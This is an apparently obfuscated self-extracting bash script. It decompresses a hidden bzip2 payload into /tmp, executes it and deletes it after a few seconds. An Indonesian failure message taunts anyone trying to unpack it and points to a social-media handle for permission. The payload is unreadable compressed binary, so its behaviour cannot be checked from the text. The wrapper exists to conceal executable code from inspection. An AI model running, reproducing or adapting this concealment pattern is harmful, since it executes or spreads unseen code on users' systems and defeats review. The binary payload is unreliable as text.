#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY� ��  �߀@��'�:����Pso��$�2�Pڌ���C@� 4h�S�3M@     �?�UP L �& L &L"���"cS5=M2  �  �$	�e6�~�F��4O�=4=A�h{7���?Q�"o����9Ħ�X���#ë\�ʅ�V�������	`�08,�0@�1)�@��&�     r�Z{��:��?�F�0�����S)�� ��	�۰�`�>��}(��4��
��
��s��|���~�xߢ��<��/�?'�G�q;�#��=��m											�F����D�������=�6-�s�R�:6����S ��#��R{��3u��3��GQ���1"9��ׄbH�����(�'mq�� ��	3x�K��IOj����9�bA` �-L�
����9��ͳq�0�*k�]I���������8��e�2�1�I$�N|����v��G�GwV�~9�	 c��v��#��h:��Q��tF
�@\&�-�A�G����� ��\/�nm�������a2�������F�#��z�xbHHYT0j�	��jnoQ�#&"3���ʱģ5؄�U�1������Q��h�a}�#�6�� ���&�H�B�G阍�0�ga��Ԏ��3�ɹ�[�2�#%�ۭJcb��G@��#S2���T�f���yd� Џo߃��$�p�Gkv�k�I$�NF��Gcc���9&hg#�!'l�rE8P�� ��